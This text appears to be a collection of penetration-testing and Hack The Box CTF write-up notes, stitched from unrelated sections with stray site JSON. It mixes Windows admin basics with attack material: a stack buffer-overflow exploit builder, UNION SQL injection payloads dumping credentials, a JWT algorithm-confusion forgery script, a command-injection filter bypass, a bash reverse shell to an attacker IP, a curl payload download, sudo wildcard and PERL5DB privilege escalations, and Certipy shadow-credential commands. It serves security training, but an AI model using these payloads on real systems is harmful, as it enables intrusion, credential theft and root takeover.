Now, we can add the bad chars defined in the txt file into the payload script:  def bad_chars(): all_chars = bytes([ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, ...SNIP... 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF ]) offset = 4112 buffer = b&quot;A&quot;*offset eip = b&quot;B&quot;*4 payload = buffer + eip + all_chars with open('chars.wav', 'wb') as f: f.write(payload) bad_chars()   and generate the payload again and run the program.

We can use a legacy method called Jumping to Stack. We'll redirect the EIP point to the top of the stack, and we'll place the shellcode directly in the input data. This is considered a legacy method because it will not work in modern machines. In order to do so, we can:  Write the ESP address in the EIP.Use a JMP ESP instruction.  Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a JMP ESP instruction we can use within the program.  Writing the ESP address might not work because of the bad characters. It's more realiable to use the JMP ESP instruction. Any machine code in the program that contains the JMP ESP will be useful. We should search inside the program's exe file, the program's dll files or the OS dll files used by the program.  We can have such files by calling ERC --ModuleInfo.  Make sure the executables listed do not have any protection such as NXCompat, ASLR or Rebase.  Once we identified the viables files, we can go to the Symbols tag, double click in the file and search for the JMP ESP instruction. To search, just simply use CTRL+F and enter jmp esp.  As previously, we need to make sure the address does not contain any bad character.  Another example of a basic command to jump to the stack is PUSH ESP followed by RET. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use Online Assemblers, or the msf-nasm_shell tool to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code.  Now, we can go to the CPU tab and search patterns using CTRL+B and enter the assembler code into the hex field. It's important to search for entire block!

However, depending on the program's current Stack Frame and Stack Alignment, by the time our JMP ESP instruction is executed, the top of the stack address ESP may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail.  To prevent this, we can add a few NOP bytes before our shellcode, which has the machine code 0x90. The stack alignment needed is usually not more than 16 bytes in most cases, and it may rarely reach 32 bytes.

For example:  mysql&gt; SELECT city FROM ports UNION SELECT * FROM ships; ERROR 1222 (21000): The used SELECT statements have a different number of columns   When the number of columns doesn't fit, you can just use a number to fill the missing columns.  We can use UNION as another source of injections. For example in the query:  SELECT * FROM products WHERE product_id = 'user_input'   We can enter the following payload:  1' UNION SELECT username, password from passwords--   which will end up in the following query:  SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '   and will reveal usernames and passwords.

In order to do so, we can use ORDER BY statement:  ' order by 1-- -, we can keep up incrementing the number until the query fails to execute, then we found the number of columns.  We can use UNION itself to detect the number of columns, e.g:  cn' UNION select 1,2,3-- -. We add numbers until it works.  We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:  cn' UNION select 1,@@version,3,4-- -.  This way, we have found where we need to put our injection.

We can use information schema database and tables table to retrieve a list of all the available tables:  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  Here, we're using UNION SQL injection to dump all the tables available for the database dev.  A similar thing can be done to retrieve the columns of certain table:  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  This will list the columns of the table named credentials.

In addition to making up for the shortcomings of FAT32, NTFS also has better support for metadata and better performance due to improved data structuring.  Pros of NTFS:  NTFS is reliable and can restore the consistency of the file system in the event of a system failure or power loss.Provides security by allowing us to set granular permissions on both files and folders.Supports very large-sized partitions.Has journaling built-in, meaning that file modifications (addition, modification, deletion) are logged.  Cons of NTFS:  Most mobile devices do not support NTFS natively.Older media devices such as TVs and digital cameras do not offer support for NTFS storage devices.  The NTFS file system has many basic and advanced permissions. Some of the key permission types are:  Permission\tDescriptionFull Control\tAllows reading, writing, changing, and deleting of files/folders. Modify\tAllows reading, writing, and deleting of files/folders. List Folder Contents\tAllows viewing and listing folders and subfolders, as well as executing files. Folders only inherit this permission. Read and Execute\tAllows viewing and listing files and subfolders, as well as executing files. Inherited by both files and folders. Write\tAllows adding files to folders/subfolders and writing to files. Read\tAllows viewing and listing of folders/subfolders and viewing file contents. Traverse Folder\tAllows moving through folders to reach other files/folders without needing permission to list folder contents. For example, with this permission, a user can access a file like c:\\users\\bsmith\\documents\\webapps\\backups\\backup_02042020.zip even without access to intermediate folders.  Files and folders inherit the NTFS permissions of their parent folder for ease of administration. If permissions do need to be set explicitly, an administrator can disable permissions inheritance for the necessary files and folders and then set the permissions directly on each.  We can use the UI to setup the permissions, or the icacls command:  C:\\htb&gt; icacls c:\\windows c:\\windows NT SERVICE\\TrustedInstaller:(F) NT SERVICE\\TrustedInstaller:(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(M) NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F) BUILTIN\\Administrators:(M) BUILTIN\\Administrators:(OI)(CI)(IO)(F) BUILTIN\\Users:(RX) BUILTIN\\Users:(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE) Successfully processed 1 files; Failed processing 0 files   The codes at the end mean:  (CI): container inherit(OI): object inherit(IO): inherit only(NP): do not propagate inherit(I): permission inherited from parent containerF : full accessD : delete accessN : no accessM : modify accessRX : read and execute accessR : read-only accessW : write-only access  Refer to https://ss64.com/nt/icacls.html for a full guide on the icacls command.

Traverse Folder / Execute File\tUsers are permitted or denied permissions to access a subfolder within a directory structure even if access to the parent folder is denied. Also allows execution of programs. List Folder / Read Data\tUsers are permitted or denied permissions to view files and folders in the parent folder. Also allows opening and viewing files. Read Attributes\tUsers are permitted or denied permissions to view basic attributes of a file or folder (e.g., system, archive, read-only, hidden). Read Extended Attributes\tUsers are permitted or denied permissions to view extended attributes of a file or folder. These vary by program. Create Files / Write Data\tUsers are permitted or denied permissions to create files within a folder and modify file contents.

Write Attributes\tUsers are permitted or denied permissions to change file attributes. Does not allow creating files or folders. Write Extended Attributes\tUsers are permitted or denied permissions to change extended attributes of a file or folder. These vary by program. Delete Subfolders and Files\tUsers are permitted or denied permissions to delete subfolders and files, but not the parent folder itself. Delete\tUsers are permitted or denied permissions to delete parent folders, subfolders, and files. Read Permissions\tUsers are permitted or denied permissions to read the permissions set on a file or folder. Change Permissions\tUsers are permitted or denied permissions to change the permissions on a file or folder. Take Ownership\tUsers are permitted or denied permissions to take ownership of a file or folder. File owners can change any permissions.  Keep in mind that NTFS permissions apply to the system where the folder and files are hosted. Folders created in NTFS inherit permissions from parent folders by default.  The share permissions apply when the folder is being accessed through SMB, typically from a different system over the network.  This means someone logged in locally to the machine or via RDP can access the shared folder and files by simply navigating to the location on the file system and only need to consider NTFS permissions.  The permissions at the NTFS level provide administrators much more granular control over what users can do within a folder or file.  Windows Defender Firewall Considerations: The Windows Defender Firewall could potentially be blocking access to the SMB share. If we are connecting from a Linux-based system the firewall will block access since it will block access from any device that is not joined to the same workgroup. It is also important to note that when a Windows system is part of a workgroup, all netlogon requests are authenticated against that particular Windows system's SAM database. When a Windows system is joined to a Windows Domain environment, all netlogon requests are authenticated against Active Directory. Local SAM database is used for login with workgroupActive Directory is used for login with Windows Domain  Once a SMB share is ready, we can mount it in a Linux machine by running:  sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/&quot;Company Data&quot; /home/user/Desktop/   In Windows, we can use net share command to see what is actually sharing. Surprisingly, we see that C:\\ is shared:  C:\\Users\\htb-student&gt; net share Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC ADMIN$ C:\\WINDOWS Remote Admin Company Data C:\\Users\\htb-student\\Desktop\\Company Data The command completed successfully.   We didn't manually share C:. The most important drive with the most critical files on a Windows system is shared via SMB at install. This means anyone with the proper access could remotely access the entire C:\\ of each Windows system on a network.  You can also use Computer Management if you want a GUI to manage Shares, Sessions or Open files.  You can view access logs of the shared data in Event Viewer. For example, we can view the logs created for every action we performed when accessing the Windows 10 target box, as well as when creating, editing and accessing the shared folder.

LSASS is also responsible for user account password changes. All events associated with this process (logon/logoff attempts, etc.) are logged within the Windows Security Log. LSASS is an extremely high-value target as several tools exist to extract both cleartext and hashed credentials stored in memory by this process.

This makes it a very powerful tool for interfacing directly with the operating system. PowerShell utilizes cmdlets, which are small single-function tools built into the shell.  Many cmdlets in PowerShell also have aliases. For example, the aliases for the cmdlet Set-Location, to change directories, is either cd or sl. Meanwhile, the aliases for Get-ChildItem are ls and gci. We can view all available aliases by typing Get-Alias.  One common way to work with a script in PowerShell is to import it so that all functions are then available within our current PowerShell console session: Import-Module .\\PowerView.ps1.  Sometimes we will find that we are unable to run scripts on a system. This is due to a security feature called the execution policy. Here, there are the different values:  Policy\tDescriptionAllSigned\tAll scripts can run, but a trusted publisher must sign scripts and configuration files (both remote and local). A prompt appears before running scripts signed by publishers not yet marked as trusted or untrusted. Bypass\tNo scripts or configuration files are blocked, and the user receives no warnings or prompts. Default\tSets the default execution policy: Restricted on Windows desktop systems, RemoteSigned on Windows Server systems. RemoteSigned\tScripts can run, but downloaded scripts must be digitally signed. Locally written scripts do not require signatures. Restricted\tOnly individual commands are allowed; scripts are blocked. Blocks all script file types (e.g., .ps1xml, .psm1, .ps1). Undefined\tNo execution policy is set for the current scope. If all scopes are set to undefined, the system defaults to Restricted. Unrestricted\tDefault for non-Windows computers and cannot be changed. Allows all scripts to run.  The execution policy is not meant to be a security control that restricts user actions. A user can easily bypass the policy by either typing the script contents directly into the PowerShell window, downloading and invoking the script, or specifying the script as an encoded command. It can also be bypassed by adjusting the execution policy (if the user has the proper rights) or setting the execution policy for the current process scope (which can be done by almost any user as it does not require a configuration change and will only be set for the duration of the user's session).

They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.

Note that the flag should be fully ASCII ans starts with 'htb{'. GloVe is an unsupervised learning algorithm for obtaining vector representations for words: https://nlp.stanford.edu/projects/glove/. An analogy can be expressed such as: A : B :: C : _?_ In order to compute the ?, we need to do: B - A + C e.g. : France : Paris :: Italy : _?_ You solve for: wv('France') - wv('Paris') + wv('Berlin') = target_coordinates I was a bit confused of what to do at this point, because there's the word flag in the corpus. However, when you resolve the analogy, it does not look like the format expected. Instead, what it needs to be done is resolve every analogy and the append every result into a word. That word will be the final flag. After doing that and strip and remove the spaces, we got something that looks like the flag, but still it's not. The numbers are adding some weird space.

The original flag data is nowhere to be found, but luckily we not only have the encrypted file but also the encryption program itself. We are given a binary file called encrypt and the file flag.enc We need to reverse the binary, the main function expects the file flag to be present, if it is it encrypts it with the algorithm and generate the flag.enc file. The first 4 bytes in the file and the 32-bit truncated system-time used for the encryption The next content in the content of flag file shifted somehow: -rw-rw-r-- 1 gal gal 11 Aug 16 15:10 flag -rw-rw-r-- 1 gal gal 15 Aug 16 15:10 flag.enc Whatever content you write in flag, flag.enc is the same size plus 4 bytes (32-bit truncated unix time) The next content is encrypted doing some bitwise operations: Computes a random integer, take the lowest 8 bits and do XOR with the byte at position iComputes another random integer restricted from 0 to 7.Perform left bitwise shift by the number determined by the random number. This is not standard bitwise shirt, in the standard operation the excess bit are lost, however here there are pushed through the start of the binaries. In order to so, first perform the standard bit shift and then perform the right bitwise shit of the excess bits (8-random number) and finally perform the bitwise OR of the two shifted values. It's easy to visualize in an example: In order to revert the encryption, first we need to be able to generate exactly the same sequence of random number. Since computers use pseudo-random number generators (PRNG) and we have the seed, we can generate exactly the same sequence of random number. But, there's one caveat: python and c uses different PRNG implementations. Having said that, the first starting point is trying to write our own encryption program in python and make sure another file is generated with exactly the same content: └─$ python reencrypt.py # generates flag.reenc from python implementation └─$ md5sum flag.enc flag.reenc 4c5c95630c496b16c9977521647d5d6a flag.enc 4c5c95630c496b16c9977521647d5d6a flag.reenc The key to do this was to used ctypes library to actually call libc srand() and rand() functions to generate the same sequence of random numbers. Once we have the encryption mechanism written in python, we can write the decryption mechanism. Just remember to invert the order of the algorithm: Request the random number for the XORRequest the random number for the bit shiftingRevert the bit shifting: what was shifted left, now is shifted right and vice versaRevert the XOR And voilà, you will get the flag!","keywords":"","version":"Next"},{"title":"Spookypass","type":0,"sectionRef":"#","url":"/docs/write-up/htb/challenges/spookypass","content":"Spookypass https://app.hackthebox.com/challenges/SpookyPass All the coolest ghosts in town are going to a Haunted Houseparty - can you prove you deserve to get in?

When a user attempts to authenticate using such a credential, the system presents a cryptographic proof tied to the private key, and AD validates it against the public key material linked via this attribute.  Attackers with write access to an account's msDS-KeyCredentialLink attribute can add their own public key material, creating what's known as &quot;shadow credentials.&quot; This allows the attacker to subsequently authenticate as that user without needing their password, by using the corresponding private key they control. Certipy's shadow auto command can be used to exploit this if the necessary permissions are available. While distinct from AD CS certificate abuse, it's another form of key-based authentication bypass/persistence.  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69' [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)   This is because the clock is not synchronized between the attacking machine and the target.

Now that we have SSH access, we can do port forwarding to access the instance running in localhost:  ssh -L 8080:localhost:8080 matthew@surveillance.htb   We can have access to the ZoneMinder thing by using the user admin and the same password as matthew.  Now we can see the version: v1.36.32  Looks like it's vulnerable to https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437 because it mentions prior versions to 1.36.33 and 1.37.33  Since the process does not appear for the user matthew, it might be running for another user or for root. Either way, we can try to exploit the RCE vulnerability and continue from there.  The POC worked perfectly and we got access to user zoneminder. Now let's improve the shell and continue.  Checking what the user can do, looks like it can execute some script as root without specifying a password:  zoneminder@surveillance:~$ sudo -l Matching Defaults entries for zoneminder on surveillance: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl * zoneminder@surveillance:~$   This means any user can run any binary called zm*.pl in the /usr/bin/ directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit.  echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' &gt; /var/tmp/exploit.sh chmod +x /var/tmp/exploit.sh   Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:  sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'   Now execute the copied bash with -p and we got root access.

We see there are two folders: uploads and backups shown in the Admin panel. The admin panel only shows php files, but if we create a backup we'll have access to the uploads content.  The URL format of the backup is http://nocturnal.htb/backups/backup_2025-08-17.zip. We can try to bruteforce the backup folder and see if we find something interesting. Nothing found ...  However, checking the code of the create backup function, a potential command injection is found via the password file  $command = &quot;zip -x './backups/*' -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; . &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;   However, the password input is cleaned:  function cleanEntry($entry) { $blacklist_chars = [';', '&amp;', '|', '$', ' ', '`', '{', '}', '&amp;&amp;']; foreach ($blacklist_chars as $char) { if (strpos($entry, $char) !== false) { return false; // Malicious input detected } } return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8'); }   After messing around, I found a way to bypass the cleaning function: use newline character to execute different commands, e.g:  ls id   Newline character is not cleaned up from the user input. Since we have access to the source code, we can prepare an experiment to see if we can bypass the limitation with \\n:  $entry=&quot;1\\nid&gt;/tmp\\n&quot;; $password = cleanEntry($entry);   Since we want to retrieve the output of the id command, we need to force an error. In the legitimate command, stdout and stderr are redirected to a log:  $command = &quot;zip -x './backups/*' -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; . &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;   The only thing now missing is testing it via the UI. However, due to the nature of the HTML components, looks like the password is not sent to the PHP endpoint as we want. Instead, we can rely to manual execution with curl.  If we try to send \\n char our command injection will fail, however, we can send the url-encoded version of the payload:  password=1%0Aid&gt;/tmp%0A&amp;backup=   In the same way, we can leverage \\t instead of .  And we will see the contents of the id command in the returned logs.  Now, we can try to create a reverse shell abusing of this RCE. Since there are a lot of restrictions on the command injection, we'll build the reverse shell payload locally and upload it to the target.  Go to revshells.comWrite the reverse shell to a file in the attacker machine  echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.173/9001 0&gt;&amp;1&quot;' &gt; payload   Download the payload in the victim machine. Pass the command injection with a payload that will execute:  curl 10.10.14.173:8000/shell -o payload   This will download the payload to same directory 4.

This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.

Let's give it a try ...  Interesting, this technique does not seem to work with echo for some kind of reason but work with ls for instance. Looks like echo is a bult-in executable in the shell and does not use the PATH variable to determine where is it.  We can use PERL5OPT to set the debugger flag for perl and PERL5DB to specify the command we want to use as a debugger:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;ls&quot;);' /opt/monitor.sh queries user.txt   However, if we try to get a shell from here, we'll fail:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;/bin/bash&quot;);' /opt/monitor.sh /bin/bash: line 1: syntax error near unexpected token `newline' /bin/bash: line 1: `&lt;?xml version=&quot;1.0&quot;?&gt;' No DB::DB routine defined at /usr/bin/xml_pp line 9.
